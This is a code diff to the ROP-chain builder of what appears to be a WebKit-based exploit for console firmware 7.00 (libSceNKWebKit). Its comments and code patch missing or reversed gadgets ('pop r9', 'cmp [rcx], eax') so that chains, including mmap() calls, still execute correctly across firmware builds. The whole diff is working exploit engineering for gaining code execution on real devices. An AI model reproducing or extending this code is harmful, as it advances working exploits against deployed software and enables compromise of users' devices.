@@ -146,8 +146,30 @@ class rop {
         }
 
         if (r9 != undefined) {
-            this.push(this.gadgets["pop r9"]);
-            this.push(r9);
+            /* Some builds have no `pop r9 ; ret` at all -- 7.00's
+               libSceNKWebKit contains 63 `41 59` bytes and not one is
+               followed by C3. Those profiles set OFFSET_wk_r9_zero_only and
+               point "pop r9" at a stand-in that zeroes r9 and consumes NO
+               stack slot (`xor r9d,r9d ; test r9,r9 ; setne al ; ret`), so
+               the slot must NOT be pushed or the whole chain shifts by one
+               qword. Every 6-argument call in the engine is an mmap() whose
+               6th argument is 0, so this is exact -- but refuse loudly rather
+               than silently pass the wrong value if that ever stops holding. */
+            const r9ZeroOnly = (typeof OFFSET_wk_r9_zero_only !== "undefined")
+                && OFFSET_wk_r9_zero_only;
+            if (r9ZeroOnly) {
+                const isZero = (typeof r9 === "number")
+                    ? r9 === 0
+                    : (r9 && r9.low === 0 && r9.hi === 0);
+                if (!isZero)
+                    throw new Error("this firmware has no `pop r9; ret`; the"
+                        + " stand-in can only produce r9 = 0, but 0x"
+                        + (r9.toString ? r9.toString(16) : r9) + " was requested");
+                this.push(this.gadgets["pop r9"]);   // no stack slot
+            } else {
+                this.push(this.gadgets["pop r9"]);
+                this.push(r9);
+            }
         }
 
     }
@@ -363,7 +385,17 @@ class rop {
         if (dereference_compare_value) {
             this.push(this.gadgets["mov rax, [rax]"]);
         }
+        /* Builds without `cmp [rcx], eax ; ret` set
+           OFFSET_wk_cmp_operands_reversed and supply `cmp eax, [rcx] ; ret`
+           instead. ZF is symmetric so EQUAL is exact, but CF/SF/OF are
+           inverted, which silently flips every ordered comparison. */
         this.push(this.gadgets["cmp [rcx], eax"]);
+        if ((typeof OFFSET_wk_cmp_operands_reversed !== "undefined")
+            && OFFSET_wk_cmp_operands_reversed
+            && type != this.branch_types.EQUAL)
+            throw new Error("this firmware's `cmp [rcx], eax` gadget has its"
+                + " operands reversed; only branch_types.EQUAL is exact,"
+                + " ordered comparisons would silently invert");
         this.push(this.gadgets["pop rax"]);
         this.push(0);
 
